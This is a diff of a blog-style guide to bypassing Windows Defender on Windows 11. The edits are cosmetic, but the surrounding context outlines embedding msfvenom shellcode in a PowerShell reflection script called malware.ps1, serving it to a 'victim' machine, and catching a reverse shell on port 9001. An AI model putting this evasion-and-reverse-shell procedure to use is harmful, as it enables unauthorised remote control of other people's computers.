@@ -5,6 +5,9 @@ style: fill
 color: secondary
 description: Bypass Windows Defender in Windows 11.
 ---
+### System information about Windows Defender.
+![0](../assets/img/bypass+windows+defender/0.png)
+
 ### Using reflection in PowerShell to invoke Win32 API calls from remote PowerShell file invoked by Elixir’s interactive shell.
 
 - Insert shellcode from the buf variable in the output from the following msfvenom payload
@@ -62,7 +65,7 @@ $parsnips =
 
 - Host the above in a PowerShell and name it as malware.ps1
 
-### Execution
+### Execution.
 
 - If you execute the following command in cmd will give you reverse shell.
 
@@ -106,7 +109,7 @@ powershell -noprofile $A
 Listening on 0.0.0.0 9001
 ```
 
-### Deliver the file to victim Machin
+### Deliver the file to victim Machin.
 
 ```powershell
 ┌──(kali㉿kali)-[/tmp/win11]
@@ -137,7 +140,7 @@ Serving HTTP on 0.0.0.0 port 800 (http://0.0.0.0:800/) ...
 192.168.1.140 - - [04/Dec/2021 11:14:48] "GET /malware.ps1 HTTP/1.1" 200 -
 ```
 
-### Get Revers Sell
+### Get Revers Sell.
 
 ![4](../assets/img/bypass+windows+defender/4.png)
 
